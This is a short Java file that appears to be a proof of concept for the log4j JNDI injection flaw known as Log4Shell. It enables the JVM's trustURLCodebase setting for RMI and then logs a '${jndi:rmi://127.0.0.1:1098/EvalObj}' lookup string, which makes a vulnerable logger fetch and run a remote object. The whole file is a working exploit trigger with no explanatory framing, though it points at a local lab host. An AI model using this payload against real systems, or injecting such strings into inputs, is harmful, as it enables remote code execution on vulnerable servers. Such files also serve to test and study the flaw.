package com;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
public class logger {
    static final Logger logger = LogManager.getLogger(logger.class);

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
//        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        logger.error("${jndi:rmi://127.0.0.1:1098/EvalObj}" + "error");
    }
}
